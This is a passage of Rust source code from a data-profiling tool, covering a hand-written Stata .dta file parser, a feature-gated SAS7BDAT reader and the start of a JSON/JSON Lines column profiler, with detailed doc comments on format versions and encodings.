            self.0 >= 118
        }
        /// Binary-only: whether the file has an expansion-fields
        /// (characteristics) section at all, and if so, whether each
        /// entry's length is a `u16` (V105-109) or `u32` (V110+).
        /// `None` for V102-104, which predate the section entirely.
        fn supports_extended_expansion(self) -> Option<bool> {
            if self.0 >= 110 {
                Some(true)
            } else if self.0 >= 105 {
                Some(false)
            } else {
                None
            }
        }
    }

    #[derive(Clone, Copy)]
    enum ByteOrder {
        Big,
        Little,
    }

    impl ByteOrder {
        fn u16(self, b: [u8; 2]) -> u16 {
            match self {
                Self::Big => u16::from_be_bytes(b),
                Self::Little => u16::from_le_bytes(b),
            }
        }
        fn u32(self, b: [u8; 4]) -> u32 {
            match self {
                Self::Big => u32::from_be_bytes(b),
                Self::Little => u32::from_le_bytes(b),
            }
        }
        fn u64(self, b: [u8; 8]) -> u64 {
            match self {
                Self::Big => u64::from_be_bytes(b),
                Self::Little => u64::from_le_bytes(b),
            }
        }
        fn f32(self, b: [u8; 4]) -> f32 {
            match self {
                Self::Big => f32::from_be_bytes(b),
                Self::Little => f32::from_le_bytes(b),
            }
        }
        fn f64(self, b: [u8; 8]) -> f64 {
            match self {
                Self::Big => f64::from_be_bytes(b),
                Self::Little => f64::from_le_bytes(b),
            }
        }
    }

    #[derive(Clone, Copy, PartialEq)]
    enum VariableType {
        Byte,
        Int,
        Long,
        Float,
        Double,
        FixedString(u16),
        LongString,
    }

    impl VariableType {
        fn width(self) -> usize {
            match self {
                Self::Byte => 1,
                Self::Int => 2,
                Self::Long | Self::Float => 4,
                Self::Double | Self::LongString => 8,
                Self::FixedString(len) => usize::from(len),
            }
        }
    }

    fn type_label(t: VariableType) -> &'static str {
        match t {
            VariableType::Byte | VariableType::Int | VariableType::Long => "i64",
            VariableType::Float | VariableType::Double => "f64",
            VariableType::FixedString(_) | VariableType::LongString => "String",
        }
    }

    /// Decodes a variable's on-disk type code. Verified directly against
    /// the `dta` crate's own `parse_type_code` (`schema_parse.rs`) for
    /// all three type-code eras dBase-style version forking has produced:
    /// pre-111 (ASCII-ish single-char codes, string = `0x80 + len`),
    /// 111-116 (`0xFB`-`0xFF` numeric, 1-244 = string), and 117+
    /// (`0xFFFA`-`0xFFF6` numeric, `0x8000` = strL, 1-2045 = string).
    fn parse_type_code(code: u16, release: Release) -> Result<VariableType> {
        if release.0 >= 117 {
            Ok(match code {
                0xFFFA => VariableType::Byte,
                0xFFF9 => VariableType::Int,
                0xFFF8 => VariableType::Long,
                0xFFF7 => VariableType::Float,
                0xFFF6 => VariableType::Double,
                0x8000 => VariableType::LongString,
                1..=2045 => VariableType::FixedString(code),
                other => bail!("unrecognized Stata variable type code {other:#06x}"),
            })
        } else if release.0 >= 111 {
            Ok(match code {
                0xFB => VariableType::Byte,
                0xFC => VariableType::Int,
                0xFD => VariableType::Long,
                0xFE => VariableType::Float,
                0xFF => VariableType::Double,
                1..=244 => VariableType::FixedString(code),
                other => bail!("unrecognized Stata variable type code {other:#04x}"),
            })
        } else {
            Ok(match code {
                0x62 if release.0 >= 103 => VariableType::Byte, // 'b'
                0x69 => VariableType::Int,                      // 'i'
                0x6C => VariableType::Long,                     // 'l'
                0x66 => VariableType::Float,                    // 'f'
                0x64 => VariableType::Double,                   // 'd'
                0x80..=0xCF => VariableType::FixedString(code - 0x7F),
                other => bail!("unrecognized Stata variable type code {other:#04x}"),
            })
        }
    }

    /// WHATWG windows-1252's upper 128 code points (0x80-0xFF), verified
    /// directly against `encoding_rs`'s own `data.rs` table rather than
    /// assumed - notably, the five bytes with no real windows-1252
    /// assignment (0x81/0x8D/0x8F/0x90/0x9D) map to their own C1-control
    /// code point rather than erroring or falling back to a replacement
    /// character, per the WHATWG encoding standard `encoding_rs`
    /// implements - confirmed independently against Python's own `cp1252`
    /// codec's *assigned* mappings for the other 123 bytes before trusting
    /// this table. Pre-V118 Stata files default to this encoding; unlike
    /// dBase's ~20 named legacy codepages (see that reader's own hand-roll
    /// entry in CLAUDE.md), Stata only ever needs this one, so there's no
    /// equivalent "unsupported codepage" boundary to draw here at all -
    /// every pre-118 file's text is fully decodable.
    const WINDOWS_1252_HIGH: [u16; 128] = [
        0x20AC, 0x0081, 0x201A, 0x0192, 0x201E, 0x2026, 0x2020, 0x2021, 0x02C6, 0x2030, 0x0160,
        0x2039, 0x0152, 0x008D, 0x017D, 0x008F, 0x0090, 0x2018, 0x2019, 0x201C, 0x201D, 0x2022,
        0x2013, 0x2014, 0x02DC, 0x2122, 0x0161, 0x203A, 0x0153, 0x009D, 0x017E, 0x0178, 0x00A0,
        0x00A1, 0x00A2, 0x00A3, 0x00A4, 0x00A5, 0x00A6, 0x00A7, 0x00A8, 0x00A9, 0x00AA, 0x00AB,
        0x00AC, 0x00AD, 0x00AE, 0x00AF, 0x00B0, 0x00B1, 0x00B2, 0x00B3, 0x00B4, 0x00B5, 0x00B6,
        0x00B7, 0x00B8, 0x00B9, 0x00BA, 0x00BB, 0x00BC, 0x00BD, 0x00BE, 0x00BF, 0x00C0, 0x00C1,
        0x00C2, 0x00C3, 0x00C4, 0x00C5, 0x00C6, 0x00C7, 0x00C8, 0x00C9, 0x00CA, 0x00CB, 0x00CC,
        0x00CD, 0x00CE, 0x00CF, 0x00D0, 0x00D1, 0x00D2, 0x00D3, 0x00D4, 0x00D5, 0x00D6, 0x00D7,
        0x00D8, 0x00D9, 0x00DA, 0x00DB, 0x00DC, 0x00DD, 0x00DE, 0x00DF, 0x00E0, 0x00E1, 0x00E2,
        0x00E3, 0x00E4, 0x00E5, 0x00E6, 0x00E7, 0x00E8, 0x00E9, 0x00EA, 0x00EB, 0x00EC, 0x00ED,
        0x00EE, 0x00EF, 0x00F0, 0x00F1, 0x00F2, 0x00F3, 0x00F4, 0x00F5, 0x00F6, 0x00F7, 0x00F8,
        0x00F9, 0x00FA, 0x00FB, 0x00FC, 0x00FD, 0x00FE, 0x00FF,
    ];

    fn decode_windows_1252(bytes: &[u8]) -> String {
        bytes
            .iter()
            .map(|&b| {
                if b < 0x80 {
                    char::from(b)
                } else {
                    char::from_u32(u32::from(WINDOWS_1252_HIGH[usize::from(b) - 0x80]))
                        .unwrap_or('\u{FFFD}')
                }
            })
            .collect()
    }

    /// Finds the first NUL byte (Stata pads fixed-width string slots with
    /// zero bytes, not spaces the way dBase does), or the buffer's full
    /// length if there is none.
    fn find_null(bytes: &[u8]) -> usize {
        bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len())
    }

    /// Decodes a NUL-terminated string slot. UTF-8 (V118+) is strict -
    /// invalid bytes are a hard error, matching `encoding_rs`'s own
    /// `decode_without_bom_handling_and_without_replacement` for UTF-8,
    /// verified directly against the `dta` crate's own
    /// `decode_null_terminated`. Windows-1252 (pre-V118) never fails,
    /// per `decode_windows_1252`'s own doc comment above.
    fn decode_text(bytes: &[u8], utf8: bool) -> Result<String> {
        let content = &bytes[..find_null(bytes)];
        if utf8 {
            std::str::from_utf8(content)
                .map(str::to_string)
                .context("Stata string field is not valid UTF-8")
        } else {
            Ok(decode_windows_1252(content))
        }
    }

    struct R {
        inner: BufReader<File>,
    }

    impl R {
        fn read_exact_buf(&mut self, n: usize) -> Result<Vec<u8>> {
            let mut buf = vec![0u8; n];
            self.inner
                .read_exact(&mut buf)
                .with_context(|| format!("failed reading {n} byte(s) from a Stata .dta file"))?;
            Ok(buf)
        }
        fn read_u8(&mut self) -> Result<u8> {
            Ok(self.read_exact_buf(1)?[0])
        }
        fn read_u16(&mut self, bo: ByteOrder) -> Result<u16> {
            let b = self.read_exact_buf(2)?;
            Ok(bo.u16([b[0], b[1]]))
        }
        fn read_u32(&mut self, bo: ByteOrder) -> Result<u32> {
            let b = self.read_exact_buf(4)?;
            Ok(bo.u32([b[0], b[1], b[2], b[3]]))
        }
        fn read_u64(&mut self, bo: ByteOrder) -> Result<u64> {
            let b = self.read_exact_buf(8)?;
            Ok(bo.u64([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]]))
        }
        /// Skips `n` bytes via a seek, not a discard-buffer read - the
        /// characteristics section's own length field is untrusted input
        /// (see `MAX_VARIABLES`'s own doc comment for the same class of
        /// concern), and seeking costs nothing regardless of how large
        /// `n` claims to be, unlike allocating and filling a buffer would.
        fn skip(&mut self, n: u64) -> Result<()> {
            self.inner
                .seek(SeekFrom::Current(i64::try_from(n).unwrap_or(i64::MAX)))
                .with_context(|| format!("failed skipping {n} byte(s) in a Stata .dta file"))?;
            Ok(())
        }
        fn expect_bytes(&mut self, expected: &[u8]) -> Result<()> {
            let actual = self.read_exact_buf(expected.len())?;
            if actual != expected {
                bail!(
                    "expected {:?} in Stata .dta file, found {:?}",
                    String::from_utf8_lossy(expected),
                    String::from_utf8_lossy(&actual)
                );
            }
            Ok(())
        }
    }

    struct Preamble {
        release: Release,
        byte_order: ByteOrder,
        variable_count: u32,
        observation_count: u64,
    }

    /// Reads the file header - either the binary fixed-layout form
    /// (102-116) or the XML-tagged form (117+) - and returns just what
    /// this reader needs downstream (dataset label and timestamp are
    /// read/skipped but never surfaced, matching this reader's existing
    /// documented choice not to expose Stata's own metadata fields).
    /// Verified field-by-field against the `dta` crate's own
    /// `header_reader.rs`.
    fn read_header(r: &mut R) -> Result<Preamble> {
        let first = r.read_u8()?;
        if first == b'<' {
            r.expect_bytes(b"stata_dta><header><release>")?;
            let release_bytes = r.read_exact_buf(3)?;
            let release = parse_ascii_release(&release_bytes)?;
            if !release.is_xml_like() {
                bail!("Stata release {} appeared inside an XML header", release.0);
            }
            r.expect_bytes(b"</release><byteorder>")?;
            let tag = r.read_exact_buf(3)?;
            let byte_order = match &tag[..] {
                b"MSF" => ByteOrder::Big,
                b"LSF" => ByteOrder::Little,
                other => bail!(
                    "invalid Stata byte-order tag {:?}",
                    String::from_utf8_lossy(other)
                ),
            };
            r.expect_bytes(b"</byteorder><K>")?;
            let variable_count = if release.supports_extended_variable_count() {
                r.read_u32(byte_order)?
            } else {
                u32::from(r.read_u16(byte_order)?)
            };
            r.expect_bytes(b"</K><N>")?;
            let observation_count = if release.supports_extended_observation_count() {
                r.read_u64(byte_order)?
            } else {
                u64::from(r.read_u32(byte_order)?)
            };
            r.expect_bytes(b"</N><label>")?;
            let label_len = if release.supports_extended_dataset_label() {
                usize::from(r.read_u16(byte_order)?)
            } else {
                usize::from(r.read_u8()?)
            };
            r.skip(label_len as u64)?;
            r.expect_bytes(b"</label><timestamp>")?;
            let timestamp_len = usize::from(r.read_u8()?);
            r.skip(timestamp_len as u64)?;
            r.expect_bytes(b"</timestamp></header>")?;
            Ok(Preamble {
                release,
                byte_order,
                variable_count,
                observation_count,
            })
        } else {
            let release = Release(first);
            if release.is_xml_like() || !(102..=116).contains(&first) {
                bail!("unrecognized Stata .dta release byte {first:#04x}");
            }
            let byte_order_byte = r.read_u8()?;
            let byte_order = match (byte_order_byte, first) {
                (0x00, 102) => ByteOrder::Little,
                (0x01, _) => ByteOrder::Big,
                (0x02, _) => ByteOrder::Little,
                _ => bail!("invalid Stata byte-order byte {byte_order_byte:#04x}"),
            };
            r.read_exact_buf(2)?; // filetype (always 0x01) + unused padding
            let variable_count = u32::from(r.read_u16(byte_order)?);
            let observation_count = if release.supports_extended_binary_observation_count() {
                u64::from(r.read_u32(byte_order)?)
            } else {
                u64::from(r.read_u16(byte_order)?)
            };
            r.skip(release.dataset_label_len() as u64)?;
            if let Some(len) = release.timestamp_len() {
                r.skip(len as u64)?;
            }
            Ok(Preamble {
                release,
                byte_order,
                variable_count,
                observation_count,
            })
        }
    }

    fn parse_ascii_release(bytes: &[u8]) -> Result<Release> {
        if bytes.len() != 3 || !bytes.iter().all(u8::is_ascii_digit) {
            bail!(
                "invalid Stata XML release number {:?}",
                String::from_utf8_lossy(bytes)
            );
        }
        let n = u32::from(bytes[0] - b'0') * 100
            + u32::from(bytes[1] - b'0') * 10
            + u32::from(bytes[2] - b'0');
        let n = u8::try_from(n).with_context(|| format!("Stata release {n} out of range"))?;
        if !(102..=119).contains(&n) {
            bail!("unsupported Stata release {n} (expected 102-119)");
        }
        Ok(Release(n))
    }

    /// Reads the schema (variable types, names, sort list, formats,
    /// value-label names, variable labels), returning just the types and
    /// names this reader actually surfaces - every other subsection is
    /// still read from the stream (its byte width is release-dependent,
    /// so it can't just be skipped as one opaque blob) but its content is
    /// discarded. Verified field-by-field against the `dta` crate's own
    /// `schema_reader.rs`, including the XML-only 14-`u64` `<map>` section
    /// this reader skips wholesale (`into_record_reader`'s own sequential
    /// path - the one this project's usage takes - never actually
    /// consults those offsets, only `seek_records`'s alternative
    /// direct-seek path would).
    fn read_schema(r: &mut R, preamble: &Preamble) -> Result<(Vec<VariableType>, Vec<String>)> {
        let release = preamble.release;
        let bo = preamble.byte_order;
        let xml = release.is_xml_like();
        let n = usize::try_from(preamble.variable_count)
            .ok()
            .filter(|_| preamble.variable_count <= MAX_VARIABLES)
            .with_context(|| {
                format!(
                    "Stata variable count {} is out of a sane range",
                    preamble.variable_count
                )
            })?;

        if xml {
            r.expect_bytes(b"<map>")?;
            r.skip(14 * 8)?;
            r.expect_bytes(b"</map>")?;
        }

        if xml {
            r.expect_bytes(b"<variable_types>")?;
        }
        let entry_len = release.type_list_entry_len();
        let type_bytes = r.read_exact_buf(n * entry_len)?;
        let mut variable_types = Vec::with_capacity(n);
        for i in 0..n {
            let code = if entry_len == 2 {
                bo.u16([type_bytes[i * 2], type_bytes[i * 2 + 1]])
            } else {
                u16::from(type_bytes[i])
            };
            variable_types.push(parse_type_code(code, release)?);
        }
        if xml {
            r.expect_bytes(b"</variable_types>")?;
        }

        let utf8 = release.default_encoding_is_utf8();
        let variable_names = read_fixed_string_array(
            r,
            n,
            release.variable_name_len(),
            xml,
            b"<varnames>",
            b"</varnames>",
            utf8,
        )?;

        // Sort list: (n + 1) entries, zero-terminated by convention, but
        // the on-disk size is fixed regardless of where a zero appears -
        // this reader never uses sort order, so the whole section is just
        // skipped by byte count.
        if xml {
            r.expect_bytes(b"<sortlist>")?;
        }
        r.skip(((n + 1) * release.sort_entry_len()) as u64)?;
        if xml {
            r.expect_bytes(b"</sortlist>")?;
        }

        skip_fixed_string_array(
            r,
            n,
            release.format_entry_len(),
            xml,
            b"<formats>",
            b"</formats>",
        )?;
        skip_fixed_string_array(
            r,
            n,
            release.variable_name_len(),
            xml,
            b"<value_label_names>",
            b"</value_label_names>",
        )?;
        skip_fixed_string_array(
            r,
            n,
            release.variable_label_len(),
            xml,
            b"<variable_labels>",
            b"</variable_labels>",
        )?;

        Ok((variable_types, variable_names))
    }

    fn read_fixed_string_array(
        r: &mut R,
        count: usize,
        entry_len: usize,
        xml: bool,
        open: &[u8],
        close: &[u8],
        utf8: bool,
    ) -> Result<Vec<String>> {
        if xml {
            r.expect_bytes(open)?;
        }
        let buf = r.read_exact_buf(count * entry_len)?;
        let mut out = Vec::with_capacity(count);
        for i in 0..count {
            out.push(decode_text(&buf[i * entry_len..(i + 1) * entry_len], utf8)?);
        }
        if xml {
            r.expect_bytes(close)?;
        }
        Ok(out)
    }

    fn skip_fixed_string_array(
        r: &mut R,
        count: usize,
        entry_len: usize,
        xml: bool,
        open: &[u8],
        close: &[u8],
    ) -> Result<()> {
        if xml {
            r.expect_bytes(open)?;
        }
        r.skip((count * entry_len) as u64)?;
        if xml {
            r.expect_bytes(close)?;
        }
        Ok(())
    }

    /// Skips the characteristics section (binary "expansion fields", or
    /// XML's `<characteristics>...</characteristics>`) without parsing
    /// individual entries - this reader never surfaces characteristics,
    /// the same disclosed non-surfacing choice as variable/value labels.
    /// Verified against the `dta` crate's own `characteristic_reader.rs`:
    /// binary format's entries are a simple `(type_byte, length)` header
    /// repeated until `type_byte == 0`, with *every* non-zero type
    /// (a real characteristic or an unrecognized future one) skipped the
    /// same way - the crate's own forward-compatibility rule, replicated
    /// here exactly rather than only handling the one type this reader
    /// happens to know about.
    fn skip_characteristics(r: &mut R, release: Release, bo: ByteOrder) -> Result<()> {
        if release.is_xml_like() {
            r.expect_bytes(b"<cha")?;
            r.expect_bytes(b"racteristics>")?;
            loop {
                let head = r.read_exact_buf(4)?;
                match &head[..] {
                    b"<ch>" => {
                        let len = r.read_u32(bo)?;
                        r.skip(u64::from(len))?;
                        r.expect_bytes(b"</ch>")?;
                    }
                    b"</ch" => {
                        r.expect_bytes(b"aracteristics>")?;
                        return Ok(());
                    }
                    other => bail!(
                        "unexpected tag {:?} in Stata characteristics section",
                        String::from_utf8_lossy(other)
                    ),
                }
            }
        } else {
            let Some(extended) = release.supports_extended_expansion() else {
                return Ok(()); // V102-104: no expansion-fields section at all
            };
            loop {
                let data_type = r.read_u8()?;
                let length = if extended {
                    r.read_u32(bo)?
                } else {
                    u32::from(r.read_u16(bo)?)
                };
                if data_type == 0 {
                    return Ok(());
                }
                r.skip(u64::from(length))?;
            }
        }
    }

    /// Decodes one column's raw bytes into its string representation (or
    /// `None` for a missing value), applying the exact per-release,
    /// per-type missing-value sentinel rules verified against the `dta`
    /// crate's own `stata_byte.rs`/`stata_int.rs`/`stata_long.rs`/
    /// `stata_float.rs`/`stata_double.rs` - see those files' own module
    /// docs (and `missing_value.rs`'s summary table) for the exact bit
    /// patterns. This reader only needs *whether* a value is missing, not
    /// *which* of the 27 missing codes it is (this project's own
    /// `raw_values` already treats every missing value identically), so
    /// it never constructs the crate's own 27-variant `MissingValue` enum
    /// at all.
    fn decode_value(
        bytes: &[u8],
        vt: VariableType,
        release: Release,
        bo: ByteOrder,
        utf8: bool,
    ) -> Result<Option<String>> {
        Ok(match vt {
            VariableType::Byte => {
                let raw = bytes[0];
                let signed = raw.cast_signed();
                let missing = if release.supports_tagged_missing() {
                    signed > 100
                } else {
                    raw == 0x7F
                };
                if missing {
                    None
                } else {
                    Some(signed.to_string())
                }
            }
            VariableType::Int => {
                let raw = bo.u16([bytes[0], bytes[1]]);
                let signed = raw.cast_signed();
                let missing = if release.supports_tagged_missing() {
                    signed > 32_740
                } else {
                    raw == 0x7FFF
                };
                if missing {
                    None
                } else {
                    Some(signed.to_string())
                }
            }
            VariableType::Long => {
                let raw = bo.u32([bytes[0], bytes[1], bytes[2], bytes[3]]);
                let signed = raw.cast_signed();
                let missing = if release.supports_tagged_missing() {
                    signed > 2_147_483_620
                } else {
                    raw == 0x7FFF_FFFF
                };
                if missing {
                    None
                } else {
                    Some(signed.to_string())
                }
            }
            VariableType::Float => {
                let raw = bo.f32([bytes[0], bytes[1], bytes[2], bytes[3]]);
                let bits = raw.to_bits();
                let positive = bits & 0x8000_0000 == 0;
                let missing = if release.supports_tagged_missing() {
                    positive && bits >= 0x7F00_0000
                } else {
                    positive && bits > 0x7EFF_FFFF
                };
                if missing { None } else { Some(raw.to_string()) }
            }
            VariableType::Double => {
                let raw = bo.f64([
                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5], bytes[6], bytes[7],
                ]);
                let bits = raw.to_bits();
                let positive = bits & 0x8000_0000_0000_0000 == 0;
                let missing = if release.supports_tagged_missing() {
                    positive && bits >= 0x7FE0_0000_0000_0000
                } else if release.uses_magic_double_missing() && bits == 0x54C0_0000_0000_0000 {
                    true
                } else {
                    positive && bits > 0x7FDF_FFFF_FFFF_FFFF
                };
                if missing { None } else { Some(raw.to_string()) }
            }
            VariableType::FixedString(_) => {
                let s = decode_text(bytes, utf8)?;
                let trimmed = s.trim();
                if trimmed.is_empty() {
                    None
                } else {
                    Some(trimmed.to_string())
                }
            }
            VariableType::LongString => Some("<strL: long string not resolved>".to_string()),
        })
    }

    pub(crate) fn columns_from_stata(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        let file = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
        let mut r = R {
            inner: BufReader::new(file),
        };

        let preamble = read_header(&mut r)
            .with_context(|| format!("failed reading the header of {path:?}"))?;
        let (variable_types, variable_names) = read_schema(&mut r, &preamble)
            .with_context(|| format!("failed reading the schema of {path:?}"))?;
        skip_characteristics(&mut r, preamble.release, preamble.byte_order)
            .with_context(|| format!("failed skipping characteristics in {path:?}"))?;

        if preamble.release.is_xml_like() {
            r.expect_bytes(b"<data>")
                .with_context(|| format!("failed reading {path:?}"))?;
        }

        let row_len: usize = variable_types.iter().map(|t| t.width()).sum();
        if row_len > MAX_ROW_LEN {
            bail!("Stata row width {row_len} is out of a sane range");
        }

        let utf8 = preamble.release.default_encoding_is_utf8();
        let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); variable_types.len()];
        let mut total = 0usize;
        for _ in 0..preamble.observation_count {
            if nrows.is_some_and(|limit| total >= limit) {
                break;
            }
            let row = r
                .read_exact_buf(row_len)
                .with_context(|| format!("failed reading a record from {path:?}"))?;
            let mut offset = 0;
            for (col_idx, vt) in variable_types.iter().enumerate() {
                let width = vt.width();
                let field_bytes = &row[offset..offset + width];
                offset += width;
                let value = decode_value(
                    field_bytes,
                    *vt,
                    preamble.release,
                    preamble.byte_order,
                    utf8,
                )
                .with_context(|| format!("failed decoding a record from {path:?}"))?;
                raw[col_idx].push(value);
            }
            total += 1;
        }

        let mut columns = Vec::new();
        for ((name, vt), values) in variable_names.into_iter().zip(variable_types).zip(raw) {
            let non_null: Vec<String> = values.into_iter().flatten().collect();
            columns.push(profile_column(
                ColumnInput {
                    name,
                    current_type: type_label(vt).to_string(),
                    raw_values: non_null,
                    total,
                    skip_heuristics: false,
                },
                n_samples,
            ));
        }
        Ok(columns)
    }
} // mod stata_support

#[cfg(feature = "stata")]
fn columns_from_stata(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    stata_support::columns_from_stata(path, nrows, n_samples)
}

#[cfg(not(feature = "stata"))]
fn columns_from_stata(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "Stata support isn't compiled in - rebuild with `cargo build --release --features stata` (or --features full)"
    )
}

// --- SAS7BDAT reader (opt-in via --features sas7bdat) ---
// current_type comes from the file's own declared LogicalType metadata
// (Dataset::columns()) rather than being inferred from observed row
// values - the same "trust the format's own declaration, then let
// ideal_type independently verify it" split every other binary/typed
// format here already gets. A variable label (SAS's own human-authored
// per-column description) exists in ColumnMeta but isn't surfaced, the
// same considered decision as Stata's variable/value labels - see
// CLAUDE.md's Known limitations.

#[cfg(feature = "sas7bdat")]
fn sas_logical_type_label(t: sas7bdat::LogicalType) -> &'static str {
    use sas7bdat::LogicalType;
    match t {
        LogicalType::Integer => "i64",
        LogicalType::Float => "f64",
        LogicalType::String | LogicalType::Bytes => "String",
        LogicalType::Date => "Date",
        LogicalType::DateTime => "Timestamp",
        LogicalType::Time => "Time",
    }
}

#[cfg(feature = "sas7bdat")]
fn sas_cell_to_string(v: &sas7bdat::CellValue) -> Option<String> {
    use sas7bdat::CellValue;
    match v {
        CellValue::Null => None,
        CellValue::Int32(x) => Some(x.to_string()),
        CellValue::Int64(x) => Some(x.to_string()),
        CellValue::Float64(x) => Some(x.to_string()),
        CellValue::Str(s) => {
            let s = s.trim();
            if s.is_empty() {
                None
            } else {
                Some(s.to_string())
            }
        }
        CellValue::Bytes(b) => Some(b.iter().map(|byte| format!("{byte:02x}")).collect()),
        CellValue::Date(d) => {
            EpochDate::from_days(i64::from(d.unix_days())).map(|date| date.format_ymd())
        }
        CellValue::DateTime(dt) => {
            EpochDateTime::from_unix_seconds(dt.unix_seconds(), 0).map(|dt| dt.format_space())
        }
        CellValue::Time(t) => EpochTime::from_seconds_since_midnight(
            u32::try_from(t.seconds_since_midnight).unwrap_or(0),
            0,
        )
        .map(|nt| nt.format_hms()),
    }
}

#[cfg(feature = "sas7bdat")]
fn columns_from_sas7bdat(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    use std::ops::ControlFlow;

    let ds = sas7bdat::Dataset::open(path)
        .map_err(|e| anyhow!("{e}"))
        .with_context(|| format!("failed to open {path:?}"))?;

    let names: Vec<String> = ds.columns().iter().map(|c| c.name.clone()).collect();
    let current_types: Vec<&'static str> = ds
        .columns()
        .iter()
        .map(|c| sas_logical_type_label(c.logical_type))
        .collect();

    let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); names.len()];
    let mut total = 0usize;
    ds.scan()
        .visit_rows(|row| {
            for (col_idx, value) in row.iter().enumerate() {
                raw[col_idx].push(sas_cell_to_string(value));
            }
            total += 1;
            if nrows.is_some_and(|limit| total >= limit) {
                Ok(ControlFlow::Break(()))
            } else {
                Ok(ControlFlow::Continue(()))
            }
        })
        .map_err(|e| anyhow!("{e}"))
        .with_context(|| format!("failed reading records from {path:?}"))?;

    let mut columns = Vec::new();
    for ((name, current_type), values) in names.into_iter().zip(current_types).zip(raw) {
        let non_null: Vec<String> = values.into_iter().flatten().collect();
        columns.push(profile_column(
            ColumnInput {
                name,
                current_type: current_type.to_string(),
                raw_values: non_null,
                total,
                skip_heuristics: false,
            },
            n_samples,
        ));
    }
    Ok(columns)
}

#[cfg(not(feature = "sas7bdat"))]
fn columns_from_sas7bdat(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "SAS7BDAT support isn't compiled in - rebuild with `cargo build --release --features sas7bdat` (or --features full)"
    )
}

// --- JSON / JSON Lines reader ---
// Nesting is never force-fit into one opaque row: objects are flattened into
// dot-notation sub-columns (recursively), and array elements are pooled
// (unwrapping nested arrays) so the pool's real type(s) get reported and,
// if the pool holds objects, those get flattened too.

#[derive(PartialEq, Eq, Hash, Clone, Copy)]
enum JsonKind {
    Integer,
    Float,
    Str,
    Bool,
    Object,
}

fn kind_label(k: JsonKind) -> &'static str {
    match k {
        JsonKind::Integer => "i64",
        JsonKind::Float => "f64",
        JsonKind::Str => "String",
        JsonKind::Bool => "bool",
        JsonKind::Object => "object",
    }
}

/// current_type label for a pool of observed kinds: the single kind if
/// consistent, otherwise every observed kind with its count, e.g.
/// "mixed(String: 1, i64: 2)" - so an inconsistency is never just flagged,
/// it's fully enumerated.
fn describe_kinds(counts: &HashMap<JsonKind, usize>) -> String {
    if counts.len() == 1 {
        return kind_label(*counts.keys().next().unwrap()).to_string();
    }
    let mut parts: Vec<(String, usize)> = counts
        .iter()
        .map(|(k, c)| (kind_label(*k).to_string(), *c))
        .collect();
    parts.sort_by(|a, b| a.0.cmp(&b.0));
    let inner = parts
        .iter()
        .map(|(label, count)| format!("{label}: {count}"))
        .collect::<Vec<_>>()
        .join(", ");
    format!("mixed({inner})")
}

/// Recursively unwraps arrays of any depth into a flat pool of non-array,
/// non-null leaf values (scalars and/or objects), noting whether an array
/// was seen anywhere along the way.
fn unwrap_arrays<'a>(values: &[&'a JsonValue]) -> (Vec<&'a JsonValue>, bool) {
    fn walk<'a>(v: &'a JsonValue, pool: &mut Vec<&'a JsonValue>, saw_array: &mut bool) {
        match v {
            JsonValue::Array(items) => {
                *saw_array = true;
                for item in items {
                    if !item.is_null() {
                        walk(item, pool, saw_array);
                    }
                }
            }
            _ => pool.push(v),
        }
    }
    let mut pool = Vec::new();
    let mut saw_array = false;
    for v in values {
        walk(v, &mut pool, &mut saw_array);
    }
    (pool, saw_array)
}

/// Reads either a top-level JSON array, a single JSON document (object or
/// scalar, possibly pretty-printed across multiple lines), or JSON Lines
/// (one value per non-empty line) - detected by whether the trimmed
/// content starts with '[', then by whether the *whole* content parses as
/// one value. Every element/line must itself be valid JSON, but is *not*
/// required to be an object here - a top-level array or JSON Lines stream
/// of bare scalars (`[1, 2, 3]`, or one ID per line) is a real, common
/// shape with no natural field names but still a genuine single column,
/// same as a headerless CSV or NumPy's plain 1D array elsewhere in this
/// file - columns_from_json decides what to do with the result.
fn read_json_values(path: &Path) -> Result<Vec<JsonValue>> {
    let content = fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;
    let trimmed = content.trim_start();

    if trimmed.starts_with('[') {
        return serde_json::from_str(&content)
            .with_context(|| format!("failed to parse {path:?} as a JSON array"));
    }

    // A single JSON document - most commonly a pretty-printed object, the
    // overwhelmingly common shape for a hand-authored or tool-saved
    // config/response file - parses as exactly one value with nothing
    // left over. Try that first, the same "whole document = one record"
    // choice TOML and YAML's single-mapping mode already make for their
    // own single-document shapes. A genuine multi-record JSON Lines
    // stream fails this: serde_json::from_str rejects trailing content
    // after a complete value ("trailing characters", confirmed directly
    // rather than assumed), so it falls through to per-line parsing below
    // exactly as before - this is a pure additive fallback, not a
    // replacement for JSON Lines detection.
    if let Ok(v) = serde_json::from_str::<JsonValue>(&content) {
        return Ok(vec![v]);
    }

    trimmed
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(|line| {
            serde_json::from_str(line)
                .with_context(|| format!("failed to parse a line of {path:?} as JSON"))
        })
        .collect()
}

/// Profiles one JSON "path". `total` is how many parent slots could have held
/// a value here (for missing %); `values` are the non-null values actually
/// found there. Returns this path's own row followed by every descendant row
/// (dot-notation), in order, so nested content always ends up reported, not
/// just labelled.
fn profile_json_path(
    name: String,
    total: usize,
    values: Vec<&JsonValue>,
    n_samples: usize,
) -> Vec<ColumnProfile> {
    let missing = total.saturating_sub(values.len());
    let missing_pct = round1(if total > 0 {
        missing as f64 / total as f64 * 100.0
    } else {
        0.0
    });

    if values.is_empty() {
        return vec![ColumnProfile {
            name,
            current_type: "null".to_string(),
            ideal_type: "String".to_string(),
            description: String::new(),
            missing_pct,
            sample_values: Vec::new(),
            notes: "column is empty/all null".to_string(),
        }];
    }

    let (pool, saw_array) = unwrap_arrays(&values);
    let wrap = |s: &str| {
        if saw_array {
            format!("Vec<{s}>")
        } else {
            s.to_string()
        }
    };

